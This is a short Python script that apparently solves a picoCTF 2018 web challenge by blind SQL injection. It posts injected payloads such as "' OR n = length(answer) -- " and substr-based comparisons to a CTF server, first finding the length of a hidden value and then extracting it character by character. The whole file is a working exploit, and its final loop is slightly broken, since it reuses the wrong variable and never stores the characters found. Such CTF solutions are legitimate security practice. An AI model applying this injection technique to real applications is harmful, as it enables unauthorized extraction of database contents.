import requests


sql1 = "' OR {0} = length(answer) -- "
url = 'http://2018shell3.picoctf.com:36052/answer2.php'
proxies = {'http': 'http://localhost:8888', 'https': 'https://localhost:8888'}

for i in range(100):
    data = {
        'answer': sql1.format(i),
        'debug': 0
    }

    # res = requests.post(url=url, data=data, proxies=proxies)
    res = requests.post(url=url, data=data)
    if 'Wrong' not in res.text:
        index = i
        break

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
index2 = 1


def search_char(index):
    sql2 = "' OR '{0}' = substr(answer, {1}, 1) -- "
    for c in chars:
        data2 = {
            'answer': sql2.format(c, index),
            'debug': 0
        }
        # res2 = requests.post(url=url, data=data2, proxies=proxies)
        res2 = requests.post(url=url, data=data2)
        if 'Wrong' not in res2.text:
            print('[+]hit!! WHERE:{0}, char:{1}'.format(data2['answer'], c))
            return


for i in range(i):
    search_char(i + 1)
